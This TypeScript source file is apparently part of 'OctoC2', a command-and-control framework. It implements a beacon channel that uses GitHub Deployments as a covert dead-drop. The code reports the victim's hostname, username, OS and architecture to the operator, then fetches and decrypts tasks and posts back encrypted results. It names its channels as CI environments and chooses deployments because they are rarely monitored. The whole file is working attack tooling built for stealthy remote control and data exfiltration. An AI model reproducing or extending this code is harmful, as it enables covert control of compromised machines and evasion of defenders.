/**
 * OctoC2 — PagesTentacle (Tentacle 5 — GitHub Deployments dead-drop channel)
 *
 * Uses GitHub Deployments + Deployment Statuses as a covert dead-drop.
 * Deployments are not indexed by search engines and are rarely monitored
 * in the GitHub web UI (hidden in the Deployments tab).
 *
 * Protocol:
 *   ACK          Beacon → Server: deployment with environment="ci-{id8}",
 *                                  description=JSON{beaconId,publicKey,hostname,...}
 *   Task poll    Server → Beacon: deployment with environment="ci-t-{id8}",
 *                                  payload=JSON{nonce,ciphertext} (encrypted Task[])
 *   Result       Beacon → Server: deployment with environment="ci-r-{id8}",
 *                                  payload=sealedResult (base64url)
 *
 * Availability: requires token with `deployments` read+write scope.
 */

import { BaseTentacle } from "./BaseTentacle.ts";
import {
  decryptBox, sealBox,
  bytesToBase64, base64ToBytes,
} from "../crypto/sodium.ts";
import type { CheckinPayload, Task, TaskResult } from "../types.ts";

const OPERATOR_PUBKEY_VAR = "MONITORING_PUBKEY";

export class PagesTentacle extends BaseTentacle {
  readonly kind = "pages" as const;

  private operatorPublicKey: Uint8Array | null = null;
  private ackSent = false;
  private ackDeploymentId: number | null = null;
  private lastTaskDeploymentId: number | null = null;

  // ── Helpers ───────────────────────────────────────────────────────────────────

  private get id8(): string { return this.config.id.slice(0, 8); }

  // ── Availability ─────────────────────────────────────────────────────────────

  override async isAvailable(): Promise<boolean> {
    try {
      await this.octokit.rest.repos.listDeployments({
        owner: this.config.repo.owner,
        repo:  this.config.repo.name,
        per_page: 1,
      });
      return true;
    } catch {
      return false;
    }
  }

  // ── Operator key resolution ───────────────────────────────────────────────────

  private async getOperatorPublicKey(): Promise<Uint8Array> {
    if (this.operatorPublicKey) return this.operatorPublicKey;
    const resp = await this.octokit.rest.actions.getRepoVariable({
      owner: this.config.repo.owner,
      repo:  this.config.repo.name,
      name:  OPERATOR_PUBKEY_VAR,
    });
    const b64 = resp.data.value?.trim();
    if (!b64) throw new Error("PagesTentacle: MONITORING_PUBKEY variable not set");
    const key = await base64ToBytes(b64);
    if (key.length !== 32) throw new Error("PagesTentacle: operator public key is not 32 bytes");
    this.operatorPublicKey = key;
    return key;
  }

  // ── Checkin ──────────────────────────────────────────────────────────────────

  async checkin(payload: CheckinPayload): Promise<Task[]> {
    // 1. Send ACK deployment on first checkin (before key fetch — mirrors GistTentacle)
    if (!this.ackSent) {
      try {
        const ackDescription = JSON.stringify({
          beaconId:  this.config.id,
          publicKey: await bytesToBase64(this.config.beaconKeyPair.publicKey),
          hostname:  payload.hostname,
          username:  payload.username,
          os:        payload.os,
          arch:      payload.arch,
          checkinAt: payload.checkinAt,
        });
        const ackResp = await this.octokit.rest.repos.createDeployment({
          owner:             this.config.repo.owner,
          repo:              this.config.repo.name,
          ref:               "main",
          environment:       `ci-${this.id8}`,
          description:       ackDescription,
          auto_merge:        false,
          required_contexts: [],
        } as any);
        this.ackDeploymentId = (ackResp.data as any).id ?? null;
      } catch { /* best-effort ACK */ }
      this.ackSent = true;
    }

    // 2. Fetch operator public key (needed for decryption)
    let operatorPubKey: Uint8Array;
    try {
      operatorPubKey = await this.getOperatorPublicKey();
    } catch {
      return [];
    }

    // 4. Poll for task deployment
    let deployments: any[];
    try {
      const listResp = await this.octokit.rest.repos.listDeployments({
        owner:       this.config.repo.owner,
        repo:        this.config.repo.name,
        environment: `ci-t-${this.id8}`,
        per_page:    1,
      });
      deployments = (listResp.data as any[]);
    } catch {
      return [];
    }

    if (!deployments || deployments.length === 0) return [];

    const deployment = deployments[0]!;

    // 3. Change detector — skip if already processed
    if (deployment.id === this.lastTaskDeploymentId) return [];

    // 4. Read payload
    let rawPayload: string;
    try {
      rawPayload = typeof deployment.payload === "string"
        ? deployment.payload
        : JSON.stringify(deployment.payload ?? "");
      if (!rawPayload || rawPayload === '""' || rawPayload === "{}") return [];
    } catch {
      return [];
    }

    // 5. Decrypt
    let tasks: Task[];
    try {
      const envelope = JSON.parse(rawPayload) as { nonce: string; ciphertext: string };
      const plainBytes = await decryptBox(
        envelope.ciphertext,
        envelope.nonce,
        operatorPubKey,
        this.config.beaconKeyPair.secretKey,
      );
      tasks = JSON.parse(new TextDecoder().decode(plainBytes)) as Task[];
    } catch {
      return [];
    }

    // 6. Record processed deployment
    this.lastTaskDeploymentId = deployment.id;

    // 7. Mark task deployment as inactive (consumption signal)
    try {
      await this.octokit.rest.repos.createDeploymentStatus({
        owner:         this.config.repo.owner,
        repo:          this.config.repo.name,
        deployment_id: deployment.id,
        state:         "inactive",
      });
    } catch { /* best-effort */ }

    return tasks;
  }

  // ── Submit result ────────────────────────────────────────────────────────────

  async submitResult(result: TaskResult): Promise<void> {
    try {
      const operatorPubKey = await this.getOperatorPublicKey();
      const sealed = await sealBox(JSON.stringify(result), operatorPubKey);

      await this.octokit.rest.repos.createDeployment({
        owner:             this.config.repo.owner,
        repo:              this.config.repo.name,
        ref:               "main",
        environment:       `ci-r-${this.id8}`,
        description:       "result",
        payload:           sealed,
        auto_merge:        false,
        required_contexts: [],
      } as any);
    } catch (err) {
      console.warn("[PagesTentacle] submitResult error:", (err as Error).message);
    }
  }

  // ── Teardown ─────────────────────────────────────────────────────────────────

  override async teardown(): Promise<void> {
    if (this.ackDeploymentId !== null) {
      try {
        await this.octokit.rest.repos.createDeploymentStatus({
          owner:         this.config.repo.owner,
          repo:          this.config.repo.name,
          deployment_id: this.ackDeploymentId,
          state:         "inactive",
        });
      } catch { /* best-effort */ }
    }
  }
}
